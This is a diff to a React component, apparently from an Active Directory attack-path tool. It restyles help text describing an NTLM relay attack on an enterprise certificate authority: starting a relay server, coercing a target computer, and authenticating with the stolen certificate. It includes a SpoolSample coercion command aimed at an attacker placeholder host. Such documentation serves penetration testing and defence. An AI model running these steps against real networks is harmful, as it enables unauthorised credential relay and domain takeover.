@@ -21,12 +21,17 @@ import { EdgeInfoProps } from '../index';
 const WindowsAbuse: FC<EdgeInfoProps> = () => {
     return (
         <>
-            <Typography variant='body2'>
-                1. Start the Relay Server The NTLM relay can be executed with tools like Inveigh or ntlmrelayx.py,
-                targeting the RPC endpoints of the enterprise CA server.
+            <Typography variant={'body1'}>1. Start the Relay Server</Typography>
+            <Typography variant={'body2'}>
+                The NTLM relay can be executed with tools like{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/Kevin-Robertson/Inveigh'>
+                    Inveigh
+                </Link>
+                , targeting the RPC endpoint of the enterprise CA server.
             </Typography>
+            <Typography variant={'body1'}>2. Coerce the Target Computer</Typography>
             <Typography variant='body2'>
-                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
+                Several coercion methods are documented here:{' '}
                 <Link
                     target='_blank'
                     rel='noopener'
@@ -52,12 +57,9 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
                 Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
             </Typography>
             <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
+            <Typography variant={'body1'}>3. Perform Certificate Authentication</Typography>
             <Typography variant='body2'>
-                3. Relay to RPC Endpoints The relayed authentication is directed to the RPC endpoints of the vulnerable
-                enterprise CA server. This requires that RPC encryption is not enforced on the target CA.
-            </Typography>
-            <Typography variant='body2'>
-                4. Authenticate using the certificate obtained as the target principal, for example by using{' '}
+                Authenticate using the certificate obtained as the target principal, for example by using{' '}
                 <Link target='_blank' rel='noopener' href='https://github.com/GhostPack/Rubeus'>
                     Rubeus
                 </Link>
